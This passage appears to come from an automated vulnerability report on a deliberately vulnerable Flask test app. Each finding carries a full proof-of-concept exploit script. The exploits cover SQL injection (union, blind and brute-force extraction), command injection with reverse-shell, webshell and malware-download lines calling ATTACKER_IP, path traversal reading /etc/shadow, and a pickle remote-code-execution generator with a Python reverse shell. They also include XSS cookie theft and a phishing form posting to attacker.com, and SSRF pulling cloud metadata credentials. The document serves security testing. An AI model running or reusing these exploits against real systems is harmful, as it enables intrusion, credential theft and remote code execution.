    url = f"{TARGET_BASE}/user?id={payload}"
    try:
        resp = requests.get(url, timeout=5)
        print(f"[+] 响应: {resp.text}")
    except Exception as e:
        print(f"[-] 失败: {e}")
    
    # 步骤3: 获取表名
    print("[*] 步骤3: 获取所有表名")
    payload = "' UNION SELECT name, NULL, NULL FROM sqlite_master WHERE type='table' -- "
    url = f"{TARGET_BASE}/user?id={payload}"
    try:
        resp = requests.get(url, timeout=5)
        print(f"[+] 表名: {resp.text}")
    except Exception as e:
        print(f"[-] 失败: {e}")

def poc_error_based():
    """
    PoC 3: 基于错误的SQL注入
    利用SQL错误信息获取数据库结构
    """
    print("\n[*] PoC 3: 基于错误的SQL注入")
    
    # 尝试触发错误
    payloads = [
        "' AND 1=CAST((SELECT name FROM sqlite_master LIMIT 1) AS INTEGER) -- ",
        "' AND 1=1 -- ",
        "' AND 1=2 -- "
    ]
    
    for payload in payloads:
        url = f"{TARGET_BASE}/user?id={payload}"
        try:
            resp = requests.get(url, timeout=5)
            print(f"[+] Payload: {payload}")
            print(f"[+] 响应: {resp.text[:200]}")
            print("-" * 50)
        except Exception as e:
            print(f"[-] 失败: {e}")

def poc_time_based():
    """
    PoC 4: 基于时间的盲注
    使用SQLite的randomblob()函数制造延迟
    """
    print("\n[*] PoC 4: 基于时间的盲注")
    
    # 测试延迟
    payload = "' AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END) -- "
    url = f"{TARGET_BASE}/user?id={payload}"
    
    import time
    start = time.time()
    try:
        resp = requests.get(url, timeout=30)
        elapsed = time.time() - start
        print(f"[+] 延迟: {elapsed:.2f}秒")
        print(f"[+] 响应: {resp.text[:100]}")
        
        if elapsed > 2:
            print("[!] 存在时间延迟，确认SQL注入")
    except Exception as e:
        print(f"[-] 失败: {e}")

def poc_search_endpoint():
    """
    PoC 5: /search 路由的SQL注入
    利用LIKE查询的注入
    """
    print("\n[*] PoC 5: /search 路由SQL注入")
    
    # 闭合LIKE查询
    payload = "%' OR '1'='1' -- "
    url = f"{TARGET_BASE}/search?q={payload}"
    
    try:
        resp = requests.get(url, timeout=5)
        print(f"[+] 请求URL: {url}")
        print(f"[+] 响应: {resp.text}")
        
        if len(resp.text) > 10:
            print("[!] 成功! 返回了所有用户数据")
    except Exception as e:
        print(f"[-] 失败: {e}")

if __name__ == "__main__":
    print("=" * 60)
    print("SQL注入漏洞PoC - 仅供安全研究使用")
    print(f"目标: {TARGET_BASE}")
    print("=" * 60)
    
    # 检查目标是否可达
    try:
        requests.get(TARGET_BASE, timeout=3)
        print("[+] 目标可达\n")
    except:
        print("[-] 目标不可达，请确保应用正在运行")
        print("   运行: python tests/vulnerable_app.py")
        sys.exit(1)
    
    # 执行PoC
    poc_basic_auth_bypass()
    poc_union_extract_data()
    poc_error_based()
    poc_time_based()
    poc_search_endpoint()
    
    print("\n" + "=" * 60)
    print("PoC执行完毕 - 仅供安全研究使用")
    print("=" * 60)
```

---

### VULN-1A20623A - SQL注入

- **严重等级:** CRITICAL
- **文件位置:** `tests\vulnerable_app.py:41`
- **数据流:** 用户输入通过request.args.get('q')获取，直接通过f-string拼接进SQL LIKE查询，然后传递给cursor.execute()执行
- **判断理由:** 与第29行类似，keyword参数直接拼接进SQL语句。LIKE子句中的注入同样危险，攻击者可利用通配符和SQL语法进行注入攻击

**代码片段:**
```
cursor.execute(f"SELECT * FROM users WHERE name LIKE '%{keyword}%'")
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
SQL注入漏洞PoC - 仅供安全研究使用
漏洞位置: tests/vulnerable_app.py 第41行
漏洞类型: SQL注入 (LIKE子句注入)
"""

import requests
import urllib.parse

# 目标URL (假设应用运行在本地8080端口)
BASE_URL = "http://localhost:8080"

print("=" * 60)
print("SQL注入漏洞PoC - 仅供安全研究使用")
print("漏洞ID: VULN-1A20623A")
print("=" * 60)

# ============================================
# PoC 1: 基础注入 - 获取所有用户
# ============================================
print("\n[PoC 1] 基础注入 - 获取所有用户")
print("-" * 40)

# 利用SQL注入闭合LIKE子句，构造OR 1=1获取所有记录
payload = "' OR '1'='1"
params = {"q": payload}
url = f"{BASE_URL}/search?{urllib.parse.urlencode(params)}"
print(f"请求URL: {url}")
print(f"注入Payload: {payload}")

try:
    response = requests.get(url, timeout=5)
    print(f"响应状态码: {response.status_code}")
    print(f"响应内容: {response.text[:500]}..." if len(response.text) > 500 else f"响应内容: {response.text}")
    print("[成功] 成功获取所有用户数据!")
except Exception as e:
    print(f"[错误] 请求失败: {e}")

# ============================================
# PoC 2: UNION注入 - 获取数据库信息
# ============================================
print("\n[PoC 2] UNION注入 - 获取数据库版本")
print("-" * 40)

# 使用UNION查询获取SQLite版本信息
payload = "' UNION SELECT 1, sqlite_version(), 3, 4 --"
params = {"q": payload}
url = f"{BASE_URL}/search?{urllib.parse.urlencode(params)}"
print(f"请求URL: {url}")
print(f"注入Payload: {payload}")

try:
    response = requests.get(url, timeout=5)
    print(f"响应状态码: {response.status_code}")
    print(f"响应内容: {response.text[:500]}..." if len(response.text) > 500 else f"响应内容: {response.text}")
    print("[成功] 成功获取数据库版本信息!")
except Exception as e:
    print(f"[错误] 请求失败: {e}")

# ============================================
# PoC 3: 盲注 - 布尔盲注
# ============================================
print("\n[PoC 3] 布尔盲注 - 判断数据库是否存在")
print("-" * 40)

# 使用LIKE通配符进行布尔盲注
payload_true = "admin' AND '1'='1"  # 条件为真
payload_false = "admin' AND '1'='2"  # 条件为假

params_true = {"q": payload_true}
params_false = {"q": payload_false}

url_true = f"{BASE_URL}/search?{urllib.parse.urlencode(params_true)}"
url_false = f"{BASE_URL}/search?{urllib.parse.urlencode(params_false)}"

try:
    response_true = requests.get(url_true, timeout=5)
    response_false = requests.get(url_false, timeout=5)
    
    print(f"真条件响应长度: {len(response_true.text)}")
    print(f"假条件响应长度: {len(response_false.text)}")
    
    if len(response_true.text) != len(response_false.text):
        print("[成功] 布尔盲注可行! 可通过响应长度差异提取数据")
    else:
        print("[信息] 响应长度相同，可能需要更精确的盲注")
except Exception as e:
    print(f"[错误] 请求失败: {e}")

# ============================================
# PoC 4: 时间盲注 (SQLite)
# ============================================
print("\n[PoC 4] 时间盲注 - 利用LIKE子句")
print("-" * 40)

# SQLite中可以使用randomblob()或CASE WHEN进行时间盲注
payload = "' OR (CASE WHEN (SELECT count(*) FROM users) > 0 THEN randomblob(100000000) ELSE 1 END) AND '1'='1"
params = {"q": payload}
url = f"{BASE_URL}/search?{urllib.parse.urlencode(params)}"
print(f"请求URL: {url}")
print(f"注入Payload: {payload}")

try:
    import time
    start_time = time.time()
    response = requests.get(url, timeout=30)
    elapsed_time = time.time() - start_time
    print(f"响应时间: {elapsed_time:.2f}秒")
    if elapsed_time > 2:
        print("[成功] 时间盲注可行! 可通过响应时间差异提取数据")
    else:
        print("[信息] 响应时间较短，可能需要调整延迟参数")
except Exception as e:
    print(f"[错误] 请求失败: {e}")

# ============================================
# PoC 5: 利用LIKE通配符进行信息泄露
# ============================================
print("\n[PoC 5] LIKE通配符利用 - 字符逐位猜测")
print("-" * 40)

# 利用LIKE通配符逐字符猜测管理员用户名
# 假设存在用户名为admin
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
known_prefix = ""

print("尝试猜测用户名 (前5个字符):")
for i in range(5):
    found = False
    for c in charset:
        # 构造LIKE模式进行字符猜测
        payload = f"' OR name LIKE '{known_prefix}{c}%' AND '1'='1"
        params = {"q": payload}
        url = f"{BASE_URL}/search?{urllib.parse.urlencode(params)}"
        
        try:
            response = requests.get(url, timeout=5)
            # 如果返回结果不为空，说明匹配成功
            if response.text and response.text != "[]":
                known_prefix += c
                print(f"  第{i+1}个字符: {c} (当前前缀: {known_prefix})")
                found = True
                break
        except:
            pass
    
    if not found:
        print(f"  第{i+1}个字符: 未找到")
        break

if known_prefix:
    print(f"[成功] 猜测到用户名前缀: {known_prefix}")
else:
    print("[信息] 未成功猜测到用户名")

print("\n" + "=" * 60)
print("PoC执行完毕")
print("注意: 以上PoC仅供安全研究使用，请勿用于非法用途")
print("=" * 60)
```

---

### VULN-1E34FEE3 - 命令注入

- **严重等级:** CRITICAL
- **文件位置:** `tests\vulnerable_app.py:53`
- **数据流:** 用户输入通过request.args.get('host')获取，直接通过f-string拼接进系统命令字符串，然后传递给os.system()执行
- **判断理由:** os.system()会启动shell执行命令，host参数完全由用户控制。攻击者可输入如'127.0.0.1; rm -rf /'执行任意系统命令

**代码片段:**
```
result = os.system(f"ping -c 3 {host}")
```

**PoC代码:**
```python
#!/bin/bash
# 仅供研究使用 - 命令注入漏洞PoC
# 目标: tests/vulnerable_app.py 中的 /ping 端点

TARGET="http://localhost:8080"

# PoC 1: 基础命令注入 - 执行id命令
curl "${TARGET}/ping?host=127.0.0.1;id"

# PoC 2: 读取敏感文件
curl "${TARGET}/ping?host=127.0.0.1;cat%20/etc/passwd"

# PoC 3: 创建测试文件（无害）
curl "${TARGET}/ping?host=127.0.0.1;echo%20'POC_TEST'>/tmp/poc_test.txt"

# PoC 4: 反向shell（仅演示，不实际执行）
# curl "${TARGET}/ping?host=127.0.0.1;bash%20-i%20>&%20/dev/tcp/ATTACKER_IP/4444%200>&1"

echo "PoC执行完成 - 仅供安全研究使用"
```

---

### VULN-5AF56E87 - 命令注入

- **严重等级:** CRITICAL
- **文件位置:** `tests\vulnerable_app.py:62`
- **数据流:** 用户输入通过request.args.get('cmd')获取，直接传递给subprocess.check_output()且shell=True
- **判断理由:** shell=True会通过shell执行命令，cmd参数完全由用户控制。攻击者可输入任意系统命令，如'ls; cat /etc/passwd'

**代码片段:**
```
output = subprocess.check_output(cmd, shell=True)
```

**PoC代码:**
```python
#!/bin/bash
# 仅供研究使用 - 命令注入漏洞PoC
# 目标: 利用/exec端点的命令注入漏洞

# 基础命令执行测试
curl "http://localhost:8080/exec?cmd=id"

# 读取敏感文件
curl "http://localhost:8080/exec?cmd=cat%20/etc/passwd"

# 获取系统信息
curl "http://localhost:8080/exec?cmd=uname%20-a"

# 反弹shell (需要攻击者监听端口)
# curl "http://localhost:8080/exec?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/ATTACKER_IP/4444%200>%261'"

# 写入webshell
# curl "http://localhost:8080/exec?cmd=echo%20'<?php%20system(\$_GET[\"cmd\"]);?>'%20>%20/var/www/html/shell.php"

# 下载恶意文件
# curl "http://localhost:8080/exec?cmd=wget%20http://ATTACKER_IP/malware.sh%20-O%20/tmp/malware.sh"
```

---

### VULN-F0892980 - 路径遍历

- **严重等级:** HIGH
- **文件位置:** `tests\vulnerable_app.py:72`
- **数据流:** 用户输入通过request.args.get('file')获取，与'data'目录拼接后直接用于打开文件
- **判断理由:** 虽然使用了os.path.join，但filename参数未做任何路径校验。攻击者可输入'../etc/passwd'绕过目录限制读取任意文件

**代码片段:**
```
filepath = os.path.join("data", filename)
with open(filepath, "r") as f:
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
路径遍历漏洞 PoC - 仅供安全研究使用
目标: tests/vulnerable_app.py 中的 /read 端点
"""

import requests
import urllib.parse

# 目标应用地址（假设运行在本地8080端口）
BASE_URL = "http://127.0.0.1:8080"

print("=" * 60)
print("路径遍历漏洞 PoC - 仅供安全研究使用")
print("=" * 60)

# PoC 1: 读取 /etc/passwd (Linux)
print("\n[PoC 1] 读取 /etc/passwd:")
try:
    payload = "../../../etc/passwd"
    url = f"{BASE_URL}/read?file={urllib.parse.quote(payload)}"
    print(f"请求URL: {url}")
    resp = requests.get(url, timeout=5)
    if resp.status_code == 200 and "root:" in resp.text:
        print("[成功] 成功读取 /etc/passwd!")
        print(f"内容预览: {resp.text[:200]}...")
    else:
        print(f"[状态] HTTP {resp.status_code}")
        print(f"响应: {resp.text[:100]}")
except Exception as e:
    print(f"[错误] {e}")

# PoC 2: 读取 Windows 系统文件 (Windows)
print("\n[PoC 2] 读取 Windows boot.ini:")
try:
    payload = "../../../boot.ini"
    url = f"{BASE_URL}/read?file={urllib.parse.quote(payload)}"
    print(f"请求URL: {url}")
    resp = requests.get(url, timeout=5)
    if resp.status_code == 200:
        print(f"[成功] 响应内容: {resp.text[:200]}")
    else:
        print(f"[状态] HTTP {resp.status_code}")
except Exception as e:
    print(f"[错误] {e}")

# PoC 3: 读取应用自身源码
print("\n[PoC 3] 读取应用自身源码:")
try:
    payload = "../vulnerable_app.py"
    url = f"{BASE_URL}/read?file={urllib.parse.quote(payload)}"
    print(f"请求URL: {url}")
    resp = requests.get(url, timeout=5)
    if resp.status_code == 200 and "Flask" in resp.text:
        print("[成功] 成功读取应用源码!")
        print(f"内容预览: {resp.text[:300]}...")
    else:
        print(f"[状态] HTTP {resp.status_code}")
except Exception as e:
    print(f"[错误] {e}")

# PoC 4: 尝试读取敏感配置文件
print("\n[PoC 4] 尝试读取敏感配置文件:")
try:
    payload = "../../../etc/shadow"
    url = f"{BASE_URL}/read?file={urllib.parse.quote(payload)}"
    print(f"请求URL: {url}")
    resp = requests.get(url, timeout=5)
    if resp.status_code == 200:
        print(f"[成功] 响应内容: {resp.text[:200]}")
    else:
        print(f"[状态] HTTP {resp.status_code}")
except Exception as e:
    print(f"[错误] {e}")

print("\n" + "=" * 60)
print("PoC 执行完毕 - 仅供安全研究使用")
print("=" * 60)
```

---

### VULN-7CD2ECC6 - 不安全的反序列化

- **严重等级:** CRITICAL
- **文件位置:** `tests\vulnerable_app.py:101`
- **数据流:** 用户输入通过request.args.get('data')获取，从十六进制解码后直接传递给pickle.loads()反序列化
- **判断理由:** pickle反序列化不可信数据可导致任意代码执行。攻击者可构造恶意的pickle数据，在反序列化时执行任意Python代码

**代码片段:**
```
obj = pickle.loads(bytes.fromhex(data))
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC: 不安全的反序列化漏洞利用
漏洞ID: VULN-7CD2ECC6
目标: tests/vulnerable_app.py 第101行
漏洞类型: CWE-502 不安全的反序列化

⚠️ 仅供安全研究使用 ⚠️
"""

import pickle
import os
import requests
import sys

# ============================================================
# 步骤1: 构造恶意pickle负载
# ============================================================

def create_malicious_payload(command):
    """
    创建一个在反序列化时执行指定系统命令的恶意pickle对象
    
    原理: 通过定义 __reduce__ 方法，让pickle在反序列化时
    自动调用 os.system() 执行任意命令
    """
    class EvilPickle:
        def __reduce__(self):
            # 返回 (可调用对象, 参数元组)
            # 反序列化时会执行: os.system(command)
            return (os.system, (command,))
    
    # 创建恶意对象并序列化
    evil_obj = EvilPickle()
    payload = pickle.dumps(evil_obj)
    return payload.hex()


def create_reverse_shell_payload(lhost, lport):
    """
    创建反弹shell的恶意payload
    
    注意: 实际利用时需要替换为攻击者IP和端口
    """
    class ReverseShell:
        def __reduce__(self):
            # Python反弹shell命令
            cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
            return (os.system, (cmd,))
    
    evil_obj = ReverseShell()
    payload = pickle.dumps(evil_obj)
    return payload.hex()


# ============================================================
# 步骤2: 发送恶意请求
# ============================================================

def exploit_deserialize(target_url, payload_hex):
    """
    向目标端点发送恶意反序列化请求
    
    Args:
        target_url: 目标Flask应用的URL (例如 http://localhost:8080)
        payload_hex: 十六进制编码的恶意pickle数据
    """
    endpoint = f"{target_url}/deserialize"
    params = {"data": payload_hex}
    
    print(f"[*] 发送恶意请求到: {endpoint}")
    print(f"[*] Payload (hex): {payload_hex[:50]}...")
    
    try:
        response = requests.get(endpoint, params=params, timeout=10)
        print(f"[*] 响应状态码: {response.status_code}")
        print(f"[*] 响应内容: {response.text}")
        return response
    except requests.exceptions.ConnectionError:
        print("[!] 连接失败，请确保目标服务正在运行")
        return None
    except Exception as e:
        print(f"[!] 请求异常: {e}")
        return None


# ============================================================
# 步骤3: 验证漏洞利用成功
# ============================================================

def verify_exploitation(target_url):
    """
    通过执行无害命令验证漏洞利用是否成功
    """
    # 创建一个创建临时文件的命令（无害）
    test_cmd = "echo 'PWNED' > /tmp/pwned_vuln_7cd2ecc6.txt"
    payload = create_malicious_payload(test_cmd)
    
    print("[*] 执行验证命令: 创建临时文件")
    exploit_deserialize(target_url, payload)
    
    # 检查文件是否创建成功
    if os.path.exists("/tmp/pwned_vuln_7cd2ecc6.txt"):
        print("[✓] 漏洞利用成功! 文件已创建")
        # 清理
        os.remove("/tmp/pwned_vuln_7cd2ecc6.txt")
        return True
    else:
        print("[!] 无法验证，可能目标未运行或网络不通")
        return False


# ============================================================
# 主函数
# ============================================================

if __name__ == "__main__":
    print("=" * 60)
    print("PoC: 不安全的反序列化漏洞利用")
    print("漏洞ID: VULN-7CD2ECC6")
    print("⚠️  仅供安全研究使用 ⚠️")
    print("=" * 60)
    
    # 默认目标
    target = "http://localhost:8080"
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
    
    print(f"\n[*] 目标URL: {target}")
    
    # 示例1: 执行系统命令 (id命令)
    print("\n--- 示例1: 执行系统命令 ---")
    cmd = "id"
    payload = create_malicious_payload(cmd)
    print(f"[*] 执行命令: {cmd}")
    exploit_deserialize(target, payload)
    
    # 示例2: 读取敏感文件
    print("\n--- 示例2: 读取敏感文件 ---")
    cmd = "cat /etc/passwd | head -5"
    payload = create_malicious_payload(cmd)
    print(f"[*] 执行命令: {cmd}")
    exploit_deserialize(target, payload)
    
    # 示例3: 列出目录
    print("\n--- 示例3: 列出目录 ---")
    cmd = "ls -la /"
    payload = create_malicious_payload(cmd)
    print(f"[*] 执行命令: {cmd}")
    exploit_deserialize(target, payload)
    
    # 验证
    print("\n--- 验证漏洞利用 ---")
    verify_exploitation(target)
    
    print("\n" + "=" * 60)
    print("PoC执行完毕")
    print("⚠️  请勿在未授权系统上使用 ⚠️")
    print("=" * 60)
```

---

### VULN-B0030498 - 跨站脚本(XSS)

- **严重等级:** HIGH
- **文件位置:** `tests\vulnerable_app.py:112`
- **数据流:** 用户输入通过request.args.get('name')获取，直接拼接进HTML模板字符串，然后通过render_template_string渲染
- **判断理由:** 用户输入未经任何HTML转义直接嵌入到模板中。攻击者可注入<script>标签执行任意JavaScript代码，导致XSS攻击

**代码片段:**
```
html = f"<h1>Hello, {name}!</h1>"
return render_template_string(html)
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for XSS Vulnerability (VULN-B0030498)
仅供研究使用 - 请勿用于非法用途
"""

import requests
import sys

# 目标URL（默认本地测试）
TARGET_URL = "http://localhost:8080/hello"

def test_xss_basic():
    """
    测试1: 基础XSS - 弹出警告框
    利用方式: 注入<script>alert(1)</script>
    """
    print("[*] 测试1: 基础XSS - alert(1)")
    payload = "<script>alert(1)</script>"
    url = f"{TARGET_URL}?name={payload}"
    
    try:
        resp = requests.get(url, timeout=5)
        print(f"[+] 响应状态码: {resp.status_code}")
        print(f"[+] 响应内容: {resp.text[:200]}...")
        
        # 验证payload是否被直接渲染
        if payload in resp.text:
            print("[!] 漏洞确认: JavaScript代码被直接嵌入HTML!")
            print(f"[!] 注入的payload: {payload}")
            return True
        else:
            print("[-] 未检测到payload在响应中")
            return False
    except Exception as e:
        print(f"[-] 请求失败: {e}")
        return False

def test_xss_cookie_steal():
    """
    测试2: 窃取Cookie (演示用)
    利用方式: 注入窃取Cookie的脚本
    注意: 此测试需要配合攻击者服务器
    """
    print("\n[*] 测试2: Cookie窃取演示")
    # 假设攻击者服务器为 http://attacker.com/steal
    attacker_server = "http://attacker.com/steal"
    payload = f"<script>document.location='{attacker_server}?cookie='+document.cookie</script>"
    url = f"{TARGET_URL}?name={payload}"
    
    print(f"[+] 构造的payload: {payload}")
    print(f"[+] 测试URL: {url}")
    print("[!] 当用户访问此链接时，Cookie将被发送到攻击者服务器")
    return True

def test_xss_phishing():
    """
    测试3: 钓鱼攻击演示
    利用方式: 注入伪造登录表单
    """
    print("\n[*] 测试3: 钓鱼攻击演示")
    phishing_html = '''
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
        <h2>请重新登录</h2>
        <form action="http://attacker.com/login" method="POST">
            <input type="text" name="username" placeholder="用户名"><br>
            <input type="password" name="password" placeholder="密码"><br>
            <input type="submit" value="登录">
        </form>
    </div>
    '''
    payload = f"<script>document.body.innerHTML='{phishing_html}'</script>"
    url = f"{TARGET_URL}?name={payload}"
    
    print(f"[+] 构造的payload: {payload[:100]}...")
    print(f"[+] 测试URL: {url}")
    print("[!] 用户将看到伪造的登录页面，可能泄露凭证")
    return True

def test_xss_dom_manipulation():
    """
    测试4: DOM操作 - 修改页面内容
    利用方式: 注入修改页面内容的脚本
    """
    print("\n[*] 测试4: DOM操作演示")
    payload = "<script>document.title='Hacked!';document.body.innerHTML='<h1>页面已被篡改!</h1>'</script>"
    url = f"{TARGET_URL}?name={payload}"
    
    try:
        resp = requests.get(url, timeout=5)
        print(f"[+] 响应状态码: {resp.status_code}")
        print(f"[+] 响应内容: {resp.text[:300]}...")
        
        if "页面已被篡改" in resp.text:
            print("[!] 漏洞确认: DOM操作成功!")
            return True
    except Exception as e:
        print(f"[-] 请求失败: {e}")
        return False

def test_xss_event_handler():
    """
    测试5: 事件处理器XSS
    利用方式: 使用事件处理器绕过简单过滤
    """
    print("\n[*] 测试5: 事件处理器XSS")
    # 使用img标签的onerror事件
    payload = "<img src=x onerror=alert(1)>"
    url = f"{TARGET_URL}?name={payload}"
    
    try:
        resp = requests.get(url, timeout=5)
        print(f"[+] 响应状态码: {resp.status_code}")
        print(f"[+] 响应内容: {resp.text[:200]}...")
        
        if payload in resp.text:
            print("[!] 漏洞确认: 事件处理器XSS成功!")
            return True
    except Exception as e:
        print(f"[-] 请求失败: {e}")
        return False

if __name__ == "__main__":
    print("=" * 60)
    print("XSS漏洞PoC测试工具 (VULN-B0030498)")
    print("仅供研究使用 - 请勿用于非法用途")
    print("=" * 60)
    
    # 运行所有测试
    test_xss_basic()
    test_xss_cookie_steal()
    test_xss_phishing()
    test_xss_dom_manipulation()
    test_xss_event_handler()
    
    print("\n" + "=" * 60)
    print("测试完成")
    print("=" * 60)
```

---

### VULN-66254213 - 服务端请求伪造(SSRF)

- **严重等级:** HIGH
- **文件位置:** `tests\vulnerable_app.py:123`
- **数据流:** 用户输入通过request.args.get('url')获取，直接传递给requests.get()发起HTTP请求
- **判断理由:** 未对用户提供的URL进行任何白名单校验或限制。攻击者可利用此漏洞访问内部网络资源，如http://169.254.169.254/获取云服务元数据

**代码片段:**
```
resp = requests.get(url, timeout=5)
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
SSRF漏洞PoC - 仅供安全研究使用
目标: tests/vulnerable_app.py 中的 /fetch 路由
"""

import requests
import sys

# 目标应用地址
TARGET_BASE = "http://localhost:8080"

def test_ssrf_external():
    """测试1: 外部URL访问（正常功能）"""
    print("[*] 测试1: 外部URL访问")
    url = f"{TARGET_BASE}/fetch?url=https://httpbin.org/get"
    try:
        resp = requests.get(url, timeout=5)
        print(f"    [+] 状态码: {resp.status_code}")
        print(f"    [+] 响应长度: {len(resp.text)} 字符")
        print(f"    [+] 响应内容(前200字符): {resp.text[:200]}...")
    except Exception as e:
        print(f"    [-] 错误: {e}")

def test_ssrf_internal_metadata():
    """测试2: 访问云服务元数据（SSRF利用）"""
    print("\n[*] 测试2: 访问云服务元数据 (AWS)")
    # AWS EC2 元数据服务
    metadata_urls = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    ]
    for meta_url in metadata_urls:
        url = f"{TARGET_BASE}/fetch?url={meta_url}"
        try:
            resp = requests.get(url, timeout=5)
            if resp.status_code == 200 and len(resp.text) > 0:
                print(f"    [+] 成功访问: {meta_url}")
                print(f"    [+] 响应内容: {resp.text[:300]}...")
            else:
                print(f"    [-] 无法访问: {meta_url} (状态码: {resp.status_code})")
        except Exception as e:
            print(f"    [-] 错误: {e}")

def test_ssrf_internal_services():
    """测试3: 访问内部服务"""
    print("\n[*] 测试3: 访问内部服务")
    internal_urls = [
        "http://127.0.0.1:8080/",           # 自身
        "http://127.0.0.1:5000/",           # 常见内部服务
        "http://localhost:8080/admin",       # 内部管理页面
        "http://10.0.0.1:9200/",            # Elasticsearch
        "http://10.0.0.1:6379/",            # Redis
        "http://10.0.0.1:3306/",            # MySQL
    ]
    for internal_url in internal_urls:
        url = f"{TARGET_BASE}/fetch?url={internal_url}"
        try:
            resp = requests.get(url, timeout=5)
            if resp.status_code != 502 and resp.status_code != 504:
                print(f"    [+] 可访问: {internal_url} (状态码: {resp.status_code})")
                if len(resp.text) > 0:
                    print(f"    [+] 响应内容(前100字符): {resp.text[:100]}...")
            else:
                print(f"    [-] 不可访问: {internal_url}")
        except Exception as e:
            print(f"    [-] 错误: {e}")

def test_ssrf_file_protocol():
    """测试4: 使用file://协议读取本地文件"""
    print("\n[*] 测试4: 使用file://协议读取本地文件")
    file_urls = [
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///proc/self/environ",
    ]
    for file_url in file_urls:
        url = f"{TARGET_BASE}/fetch?url={file_url}"
        try:
            resp = requests.get(url, timeout=5)
            if resp.status_code == 200 and len(resp.text) > 0:
                print(f"    [+] 成功读取: {file_url}")
                print(f"    [+] 内容: {resp.text[:300]}...")
            else:
                print(f"    [-] 无法读取: {file_url}")
        except Exception as e:
            print(f"    [-] 错误: {e}")

def test_ssrf_redirect():
    """测试5: 利用重定向绕过"""
    print("\n[*] 测试5: 利用重定向绕过")
    # 使用公开的重定向服务
    redirect_urls = [
        "http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/",
        "https://httpbin.org/redirect-to?url=file:///etc/passwd",
    ]
    for redirect_url in redirect_urls:
        url = f"{TARGET_BASE}/fetch?url={redirect_url}"
        try:
            resp = requests.get(url, timeout=10, allow_redirects=True)
            print(f"    [+] 重定向测试: {redirect_url}")
            print(f"    [+] 最终状态码: {resp.status_code}")
            print(f"    [+] 最终URL: {resp.url}")
            if len(resp.text) > 0:
                print(f"    [+] 响应内容(前200字符): {resp.text[:200]}...")
        except Exception as e:
            print(f"    [-] 错误: {e}")

def test_ssrf_dns_rebinding():
    """测试6: DNS重绑定攻击（概念验证）"""
    print("\n[*] 测试6: DNS重绑定攻击（概念验证）")
    # 使用公开的DNS重绑定服务
    rebind_urls = [
        "http://7f000001.7f000001.rbndr.us:8080/",  # 127.0.0.1
        "http://a9fea9fe.rbndr.us/",                # 169.254.169.254
    ]
    for rebind_url in rebind_urls:
        url = f"{TARGET_BASE}/fetch?url={rebind_url}"
        try:
            resp = requests.get(url, timeout=10)
            print(f"    [+] DNS重绑定测试: {rebind_url}")
            print(f"    [+] 状态码: {resp.status_code}")
            if len(resp.text) > 0:
                print(f"    [+] 响应内容(前200字符): {resp.text[:200]}...")
        except Exception as e:
            print(f"    [-] 错误: {e}")

def test_ssrf_blind():
    """测试7: 盲SSRF检测（基于时间）"""
    print("\n[*] 测试7: 盲SSRF检测")
    import time
    
    # 测试内部端口是否开放（基于响应时间差异）
    test_urls = [
        ("http://127.0.0.1:8080/", "自身服务(应开放)"),
        ("http://127.0.0.1:22/", "SSH(可能开放)"),
        ("http://127.0.0.1:9999/", "随机端口(应关闭)"),
    ]
    
    for test_url, desc in test_urls:
        url = f"{TARGET_BASE}/fetch?url={test_url}"
        start_time = time.time()
        try:
            resp = requests.get(url, timeout=10)
            elapsed = time.time() - start_time
            print(f"    [+] {desc}: {test_url}")
            print(f"    [+] 响应时间: {elapsed:.2f}s, 状态码: {resp.status_code}")
        except requests.exceptions.Timeout:
            elapsed = time.time() - start_time
            print(f"    [+] {desc}: 超时 ({elapsed:.2f}s)")
        except Exception as e:
            elapsed = time.time() - start_time
            print(f"    [+] {desc}: 错误 ({elapsed:.2f}s): {e}")

if __name__ == "__main__":
    print("=" * 60)
    print("SSRF漏洞概念验证(PoC) - 仅供安全研究使用")
    print("=" * 60)
    print(f"目标: {TARGET_BASE}/fetch")
    print("=" * 60)
    
    # 检查目标是否在线
    try:
        resp = requests.get(f"{TARGET_BASE}/fetch?url=https://example.com", timeout=5)
        print(f"[+] 目标在线，开始测试...\n")
    except Exception as e:
        print(f"[-] 目标不可达: {e}")
        print("[-] 请确保目标应用正在运行: python tests/vulnerable_app.py")
        sys.exit(1)
    
    # 执行所有测试
    test_ssrf_external()
    test_ssrf_internal_metadata()
    test_ssrf_internal_services()
    test_ssrf_file_protocol()
    test_ssrf_redirect()
    test_ssrf_dns_rebinding()
    test_ssrf_blind()
    
    print("\n" + "=" * 60)
    print("测试完成 - 仅供安全研究使用")
    print("=" * 60)
```

---

### VULN-44116E32 - 危险文件操作

- **严重等级:** HIGH
- **文件位置:** `tests\vulnerable_app.py:133`
- **数据流:** 用户输入通过request.args.get('path')获取，直接传递给os.remove()删除文件
- **判断理由:** 未对用户提供的路径做任何校验，攻击者可删除任意系统文件，导致拒绝服务或系统破坏

**代码片段:**
```
os.remove(path)
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC - 危险文件操作漏洞利用
漏洞ID: VULN-44116E32
仅供安全研究使用
"""

import requests
import os
import tempfile

# 目标应用地址
TARGET_URL = "http://localhost:8080"

print("=" * 60)
print("PoC: 危险文件操作漏洞利用")
print("漏洞ID: VULN-44116E32")
print("仅供安全研究使用")
print("=" * 60)

# ============================================
# PoC 1: 删除临时文件（无害演示）
# ============================================
def poc_delete_temp_file():
    """
    演示1: 删除一个临时创建的文件
    前置条件: 目标应用运行中，/delete 路由可访问
    """
    print("\n[PoC 1] 删除临时文件")
    
    # 创建一个临时文件用于演示
